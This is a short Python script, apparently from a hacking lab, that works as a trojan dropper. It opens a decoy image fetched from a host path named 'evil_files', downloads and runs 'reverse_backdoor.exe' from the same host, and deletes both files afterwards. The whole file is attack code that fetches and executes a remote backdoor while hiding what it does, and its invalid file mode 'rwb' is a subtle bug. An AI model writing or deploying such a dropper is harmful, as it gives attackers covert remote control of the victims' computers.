import requests
import subprocess
import os
import tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, "rwb") as out_file:
        out_file.write(get_response.content)


temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

download("http://10.0.2.5/evil_files/car.jpg")
subprocess.Popen("car.jpg", shell=True)

download("http://10.0.2.5/evil_files/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)

os.remove("car.jpg")
os.remove("reverse_backdoor.exe")
